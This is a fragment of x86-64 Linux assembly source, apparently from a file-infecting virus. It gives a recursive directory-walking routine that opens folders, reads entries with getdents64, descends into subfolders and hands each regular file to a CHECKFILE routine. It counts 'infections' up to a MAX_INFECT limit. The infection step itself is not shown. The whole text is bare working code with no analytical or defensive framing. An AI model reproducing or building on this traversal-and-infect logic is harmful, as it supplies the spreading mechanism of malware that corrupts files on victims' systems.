;//////////////////////////////////////////////////////////////////////////////////////////////////
;// [ DIR ]  ; DIR(pFolder, cFolder) rsi = pFolder, rax = cFolder
;//////////////////////////////////////////////////////////////////////////////////////////////////
DIR:        push           rbp
              mov          rbp,             rsp    

              sub          rsp,             cSTACKVq       

            push           r14
            push           r15
             
              ;/////////////////////////////////////////////////////////////////
              
              mov   qword [rbp - cInput],   rax            
              mov   qword [rbp - pInput],   rsi            
              mov   qword [rbp - pInfect],  rdi  

              ;/////////////////////////////////////////////////////////////////
              ; copy pInput -> Stack
              ;/////////////////////////////////////////////////////////////////
              
              mov          rcx,      qword [rbp - cInput]
              lea          rdi,            [rbp - pSTRING]
              
              xor          rdx,             rdx
              xor          r9,              r9
              
DIR11:        mov          dl,        byte [rsi + r9]         ; rsi = pInput 
              mov    byte [rdi + r9],       dl              
              inc          r9
              loop         DIR11

              ;/////////////////////////////////////////////////////////////////
              ; add slash ( /home -> /home/
              ;/////////////////////////////////////////////////////////////////
              
              mov          rax,      qword [rbp - cInput]
              lea          rsi,            [rbp - pSTRING]
            
              cmp    byte [rsi + rax - 1],  0x2F
              je           NOSLASH1
            
              mov    byte [rsi + rax],      0x2F
            
              inc   qword [rbp - cInput]
              mov          rax,      qword [rbp - cInput]

NOSLASH1:     mov    byte [rsi + rax],      0x00


              ;/////////////////////////////////////////////////////////////////
              ; open Folder
              ;/////////////////////////////////////////////////////////////////
              
              mov          rdi,             rsi               ; filename
              mov          rsi,             SYS_READ          ; read mode
              mov          rdx,             0
              mov          rax,             SYS_OPEN          ; open syscall
              syscall   

              cmp          rax,             0                 ; check if fd in eax > 0 (ok) 
              jl           DIR_ERR                            ; cannot open file.  Exit with error status 
 
              mov   qword [rbp - pFile],    rax               ; save file handle

              ;/////////////////////////////////////////////////////////////////
              ; LOOP1 until rax == 0x00 || rax == -1
              ;/////////////////////////////////////////////////////////////////
              
DENT64:       mov          rdi,      qword [rbp - pFile]      ; file handle  
              lea          rsi,            [rbp - pDIR64]
              mov          rdx,             cDIR64            ; cBuffer
              mov          rax,             SYS_DIR64         ; getdents64 syscall
              syscall
 
              cmp          rax,             0                 ; check if fd in eax > -1 (ok) 
              jl           DIR_ERR                            ; cannot read folder.  Exit with error status 
            
              cmp          rax,             0                 ; check if fd in eax > 0 (ok)
              je           FCLOSE
              
              mov   qword [rbp - cBuffer],  rax               ; save size

              ;/////////////////////////////////////////////////////////////////
              ; LOOP2 until qword [rbp - cBuffer] == 0x00
              ;/////////////////////////////////////////////////////////////////

              lea          r14,            [rbp - pDIR64]
              xor          r15,             r15
              
DIR1_LOOP:    xor          rax,             rax
              mov          ax,        word [r14 + r15 + 16]   ; Size of this dirent
              sub          ax,              19                ; Sub Size of Struct without FileName
              
              mov          rdx,             r15               ; Add Offset
              add          rdx,             19                ; Add Size of Struct without FileName
              add          rdx,             r14

              ;/////////////////////////////////////////////////////////////////
              ; find string_terminator 0x00
              ;/////////////////////////////////////////////////////////////////
              
              xor          rcx,             rcx
              mov          rcx,             r15
TZERO:        cmp    byte [r14 + 19 + rcx], 0x00
              je           TZERO1
              inc          rcx
              jmp          TZERO
TZERO1:       sub          rcx,             r15 

              mov   qword [rbp - cFName],   rcx               ; save cFilename
              mov   qword [rbp - pFName],   rdx               ; save pFilename
            
              ;///////////////////////////////////////////// 
              ; CHECK TYPE
              ;///////////////////////////////////////////// 
            
              cmp    byte [r14 + r15 + 18], DT_DIR   
              jne          NOFOLDER1
            
              ;///////////////////////////////////////////////////////////////// 
              ; [ FOLDER ]
              ;///////////////////////////////////////////////////////////////// 
            
              cmp    byte [r14 + r15 + 19], 0x2E  ; Jump if No DOT  string = "test", 0
              jne          DOTRDY

              cmp    byte [r14 + r15 + 20], 0x2E  ; Jump if DOT     string = "..", 0
              je     NEXT
              
              cmp    byte [r14 + r15 + 20], 0x00  ; Jump if ZERO    string = ".", 0
              je     NEXT
              
DOTRDY:
              ;/////////////////////////////////////////////////////////////////
              ; copy pFName -> Stack(rbp - pSTRING + cInput) 
              ;/////////////////////////////////////////////////////////////////
              
              mov          rax,      qword [rbp - cInput]
              lea          rdi,            [rbp - pSTRING + rax] ; pLocalString[cInput]
              mov          rsi,      qword [rbp - pFName]
              
              xor          rcx,             rcx
              xor          rbx,             rbx

COPYFNAME1:   mov          bl,        byte [rsi + rcx]
              mov    byte [rdi + rcx],      bl
              inc          rcx
              cmp          rcx,      qword [rbp - cFName]
              jne          COPYFNAME1
            
              ;/////////////////////////////////////////////

              lea          rsi,            [rbp - pSTRING]
              mov          rax,      qword [rbp - cInput]
              add          rax,      qword [rbp - cFName]
              mov          rdi,      qword [rbp - pInfect]
              
              call         DIR                                ; Rekursion
              
              add   qword [rbp - pInfect],  rax

              mov          rax,      qword [rbp - pInfect]
              
              cmp          rax,             MAX_INFECT
              jge          FCLOSE

              ;/////////////////////////////////////////////
              
              jmp          NEXT

NOFOLDER1:    cmp    byte [r14 + r15 + 18], DT_REG  
              jne          NEXT
            
              ;///////////////////////////////////////////////////////////////// 
              ; [ FILE ]
              ;/////////////////////////////////////////////////////////////////
              
              ;/////////////////////////////////////////////////////////////////
              ; copy pFName -> Stack(r10 + pSTRING + cInput) 
              ;/////////////////////////////////////////////////////////////////
              
              mov          rax,      qword [rbp - cInput]
              lea          rdi,            [rbp - pSTRING + rax] ; pLocalString[cInput]
             
              xor          rcx,             rcx
              xor          rbx,             rbx
              mov          rsi,      qword [rbp - pFName]
            
COPYFNAME2:   mov          bl,        byte [rsi + rcx]
              mov    byte [rdi + rcx],      bl
              inc          rcx
              cmp          rcx,      qword [rbp - cFName]
              jne          COPYFNAME2
              
              ;/////////////////////////////////////////////

              lea          rsi,            [rbp - pSTRING]
              
              mov          rax,      qword [rbp - cInput]
              add          rax,      qword [rbp - cFName]
              
              mov    byte [rsi + rax],      0x00              ; add zero termination
              
              call         CHECKFILE
              
              cmp          rax,             0x00
              jne          NEXT
              
              inc   qword [rbp - pInfect]
              
              mov          rax,       qword [rbp - pInfect]
              
              cmp          rax,              MAX_INFECT
              jge          FCLOSE

              ;/////////////////////////////////////////////////////////////////
              
NEXT:         xor          rax,             rax
              mov          ax,        word [r14 + r15 + 16]   ; Size of this dirent
            
              add          r15,             rax   
              sub   qword [rbp - cBuffer],  rax

              cmp   qword [rbp - cBuffer],  0x00              ; check factor with 0
              jne          DIR1_LOOP                          ; loop again
            
              ;/////////////////////////////////////////////////////////////////
              ; LOOP2 END 
              ;/////////////////////////////////////////////////////////////////
              
              jmp          DENT64
              
              ;/////////////////////////////////////////////////////////////////
              ; LOOP1 END 
              ;/////////////////////////////////////////////////////////////////
              
              ;/////////////////////////////////////////////////////////////////
              ; Close File Handle
              ;/////////////////////////////////////////////////////////////////
              
FCLOSE:       mov          rdi,      qword [rbp - pFile]     ; file handle
              mov          rax,             SYS_CLOSE        ; close syscall
              syscall

              ;jmp          DIR_READY
            
              ;/////////////////////////////////////////////////////////////////

DIR_ERR:      ;write        STR_ERROR,       LEN_ERROR           

              ;/////////////////////////////////////////////////////////////////
             
DIR_READY:    mov          rax,      qword [rbp - pInfect]
              
            pop            r15
            pop            r14

              mov          rsp,             rbp
            pop            rbp
              ret
